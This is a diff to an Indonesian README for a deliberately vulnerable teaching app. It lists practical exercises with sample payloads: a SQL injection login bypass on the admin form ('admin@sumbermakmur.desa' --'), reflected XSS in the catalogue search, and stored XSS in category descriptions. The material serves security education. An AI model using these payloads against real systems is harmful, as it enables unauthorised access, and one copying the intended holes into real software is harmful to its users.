@@ -263,50 +263,45 @@ sudo firewall-cmd --list-ports
 
 Mode ini digunakan untuk praktikum. Beberapa bagian aplikasi sengaja dibuat rentan agar siswa dapat mengamati konsep dasar:
 
-- SQL Injection dasar pada search katalog.
-- Reflected XSS pada parameter pencarian.
-- Stored XSS pada deskripsi produk.
+- SQL Injection (auth bypass) pada form **login admin**.
+- Reflected XSS pada parameter pencarian katalog.
+- Stored XSS pada **deskripsi kategori** (tampil di halaman utama `/`).
 
-Contoh lokasi praktikum:
-
+Panduan langkah demi langkah beserta payload contoh ada di [`TESTING.md`](./TESTING.md). Ringkasan lokasi:
 
 ```text
-1. Sql Inection
+1. SQL Injection (auth bypass)
 ```
 
 ```text
-/catalog?q=....
-```
-
-dan detail produk:
-
-```text
-/catalog/[id]
+/admin/login
 ```
 
 ```text
-/catalog?q=' OR 1=1 OR p.name LIKE '
-```
-
-
-```text
-2. XSS Scripting
+Email: admin@sumbermakmur.desa' -- 
+Password: (boleh diisi apa saja)
 ```
 
 ```text
-/admin/products/1/edit
-angka 1 merupakan ID produknya
-
-memasukan <script>alert('Reflected XSS Berhasil')</script> ke dalam field Deskripsi
+2. Reflected XSS
 ```
 
 ```text
-Pengujian XSS bisa di cek dihalaman /catalog/1
-angka 1 merupakan ID produk yang kita edit tadi
-
+/catalog?q=<script>alert('Reflected XSS')</script>
 ```
 
+```text
+3. Stored XSS
+```
 
+```text
+/admin/categories/[id]/edit
+masukkan <script>alert('Stored XSS Berhasil')</script> ke dalam field Deskripsi
+
+Pengujian bisa dicek di halaman utama /
+```
+
+Detail lengkap (kenapa payload bekerja, query mentahnya, variasi payload lain) ada di `TESTING.md`.
 
 ## 13. Update source code aplikasi
 
